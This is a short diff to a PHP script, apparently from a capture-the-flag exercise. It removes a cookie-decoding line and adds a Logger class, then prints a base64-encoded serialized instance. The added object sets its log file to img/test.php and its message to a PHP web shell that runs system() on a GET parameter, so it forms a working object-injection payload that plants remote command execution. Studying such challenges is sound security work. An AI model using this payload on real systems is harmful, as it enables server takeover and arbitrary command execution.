@@ -1,3 +1,18 @@
 <?php
-$COOKIE = "YTozOntpOjA7YTo0OntzOjI6IngxIjtzOjE6ImEiO3M6MjoieTEiO3M6MToicyI7czoyOiJ4MiI7czoxOiJkIjtzOjI6InkyIjtzOjE6ImYiO31pOjE7YTo0OntzOjI6IngxIjtzOjI6IjEyIjtzOjI6InkxIjtzOjI6IjEyIjtzOjI6IngyIjtzOjI6IjEyIjtzOjI6InkyIjtzOjI6IjEyIjt9aToyO2E6NDp7czoyOiJ4MSI7czoxOiIxIjtzOjI6InkxIjtzOjE6IjIiO3M6MjoieDIiO3M6MToiMyI7czoyOiJ5MiI7czoxOiI0Ijt9fQ==";
-print_r(unserialize(base64_decode($COOKIE)));
+class Logger
+{
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+
+    function __construct()
+    {
+        // initialise variables
+        $this->initMsg = "foo";
+        $this->exitMsg = '<?php system($_GET["cmd"]) ?>';
+        $this->logFile = "img/test.php";
+    }
+}
+
+$log = new Logger();
+print base64_encode(serialize($log))."\n";
